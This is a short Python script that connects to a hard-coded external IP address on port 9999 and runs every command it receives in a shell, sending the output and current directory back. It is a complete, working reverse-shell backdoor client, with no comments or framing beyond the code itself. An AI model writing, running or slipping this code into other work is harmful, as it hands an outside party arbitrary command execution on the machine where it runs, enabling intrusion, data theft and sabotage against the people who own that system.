import socket
import os
import subprocess

s = socket.socket()
host = "4.194.197.166"
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    data = data.decode("utf-8")

    if data[:2] == "cd":
        os.chdir(data[3:])

    if len(data) == 0:
        continue

    out = subprocess.Popen(
        data,
        shell=True,
        stdout=subprocess.PIPE,
        stdin=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    output_byte = out.stdout.read() + out.stderr.read()
    output_str = str(output_byte, "utf-8")

    currentWorkingDirectory = os.getcwd() + "> "
    s.send(str.encode(output_str + currentWorkingDirectory))

    print(output_str)
